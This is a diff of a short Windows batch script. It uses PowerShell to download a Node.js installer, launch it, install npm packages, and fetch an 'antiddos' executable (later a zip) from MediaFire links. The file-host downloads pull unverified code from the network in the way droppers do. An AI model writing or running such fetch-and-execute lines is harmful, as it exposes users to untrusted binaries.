@@ -1,2 +1,2 @@
 @echo off
-%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest https://nodejs.org/dist/v14.15.1/node-v14.15.1-x86.msi -OutFile nodejs.exe" & start nodejs.exe & npm install request & npm install log4js & %SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest http://download1590.mediafire.com/9kzf9vgzzh5g/peypmnsrk39phsy/antiddos.exe -OutFile antiddos.exe"
+%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest https://download1589.mediafire.com/62vppvyix5gg/njery5t8x8bkc9v/antiddos.zip -OutFile antiddos.zip"
